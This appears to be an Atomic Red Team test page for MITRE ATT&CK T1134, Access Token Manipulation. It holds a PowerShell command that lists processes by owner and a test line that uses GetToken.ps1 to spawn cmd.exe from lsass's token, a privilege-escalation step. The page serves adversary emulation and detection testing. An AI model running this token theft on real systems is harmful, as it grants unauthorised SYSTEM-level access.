## Access Token Manipulation

MITRE ATT&CK Technique: [T1134](https://attack.mitre.org/wiki/Technique/T1134)

Powershell / C# Code to use the token from another process

### Example List All Processes By Owner

Input:

    $owners = @{}
    gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
    get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}


## Test:

     . .\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")



     [GetToken](https://github.com/redcanaryco/atomic-red-team/tree/master/Windows/Payloads/GetToken.ps1)
